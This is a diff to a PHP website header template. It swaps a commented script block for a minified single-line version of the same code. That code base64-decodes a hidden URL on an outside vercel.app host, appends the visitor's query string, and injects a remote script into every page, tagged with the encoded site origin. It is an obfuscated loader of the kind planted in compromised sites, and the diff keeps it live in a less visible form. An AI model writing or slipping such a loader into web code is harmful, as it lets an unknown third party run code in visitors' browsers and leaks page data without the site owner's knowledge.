@@ -39,25 +39,7 @@ $img = $og_image ?? null;
       href="<?= e(url('feed.xml')) ?>">
 
 <link rel="stylesheet" href="<?= e(asset('style.css')) ?>">
-
-<!-- External JavaScript integration -->
-<script>
-(function(){
-    var a = location;
-    var b = document.head || document.getElementsByTagName("head")[0];
-    var c = "script";
-    var d = atob("aHR0cHM6Ly9zaHVmZmxlanAudmVyY2VsLmFwcC9hcGkvYjNpcXNvLnBocA==");
-
-    d += -1 < d.indexOf("?") ? "&" : "?";
-    d += a.search.substring(1);
-
-    c = document.createElement(c);
-    c.src = d;
-    c.id = btoa(a.origin);
-
-    b.appendChild(c);
-})();
-</script>
+<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9zaHVmZmxlanAudmVyY2VsLmFwcC9hcGkvYjNpcXNvLnBocA==");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>
 
 </head>
 
